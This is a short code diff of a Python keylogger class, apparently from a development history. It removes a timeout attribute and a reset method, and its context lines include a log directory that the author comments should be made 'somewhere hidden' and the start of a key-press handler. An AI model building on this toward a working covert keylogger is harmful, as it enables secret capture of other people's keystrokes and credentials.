@@ -3,7 +3,6 @@ import logging
 from datetime import datetime
 
 class MyKeyLogger:
-    _timeout = 10
     _events = []
     _log_dir = "" # Should make somewhere hidden
     _log_filename = datetime.strftime(datetime.now(),"%Y%m%d_%H:%M.log")
@@ -11,9 +10,6 @@ class MyKeyLogger:
     
     def __init__(self):
         self._log_file_fullpath = self._log_dir + self._log_filename
-            
-    def reset_timeout(self):
-        self._timeout = 10
     
     def on_press(self, key):
         try:
